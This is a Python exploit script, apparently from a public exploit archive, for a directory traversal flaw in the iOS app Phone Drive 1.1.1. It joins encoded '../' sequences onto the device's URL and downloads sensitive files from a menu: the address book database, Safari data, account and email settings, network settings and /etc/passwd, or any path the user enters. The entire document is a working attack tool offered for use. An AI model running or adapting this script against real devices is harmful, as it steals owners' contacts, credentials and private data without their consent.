#!/usr/bin/python
#----------------------------------------------------------------
#Software : iPhone/iPad Phone Drive 1.1.1
#Type of vulnerability : Directory Traversal
#Tested On : iPhone 4 (IOS 4.3.3/Jailbroken)
#----------------------------------------------------------------
#Program Developer : http://ax.itunes.apple.com/app/id431033044?mt=8
#----------------------------------------------------------------
#Discovered by : Khashayar Fereidani
#Team Website : Http://IRCRASH.COM
#English Forums : Http://IRCRASH.COM/forums/
#Team Members : Khashayar Fereidani , Arash Allebrahim
#Email : irancrash [ a t ] gmail [ d o t ] com
#Facebook : http://facebook.com/fereidani
#Twitter : http://twitter.com/ircrash
#----------------------------------------------------------------
import urllib2
def urlread(url,file):
    url = url+"/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"+file
    u = urllib2.urlopen(url)
    localFile = open('result.html', 'w')
    localFile.write(u.read())
    localFile.close()
    print "file saved as result.html\nIRCRASH.COM 2011"
print "----------------------------------------\n- iPhone/iPad Phone Drive 1.1.1 DT     -\n- Discovered by : Khashayar Fereidani  -\n- http://ircrash.com/                  -\n----------------------------------------"
url = raw_input("Enter Address ( Ex. : http://192.168.1.101:8080 ):")
f = ["","/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb","/private/var/mobile/Library/Safari","/private/var/mobile/Library/Preferences/com.apple.accountsettings.plist","/private/var/mobile/Library/Preferences/com.apple.conference.plist","/etc/passwd"]
print f[1]
id = int(raw_input("1 : Phone Book\n2 : Safari Fav\n3 : Users Email Info\n4 : Network Informations\n5 : Passwd File\n6 : Manual File Selection\n Enter ID:"))
if not('http:' in url):
    url='http://'+url
if ((id>0) and (id<6)):
    file=f[id]
    urlread(url,file)
if (id==6):
    file=raw_input("Enter Local File Address : ")
    urlread(url,file)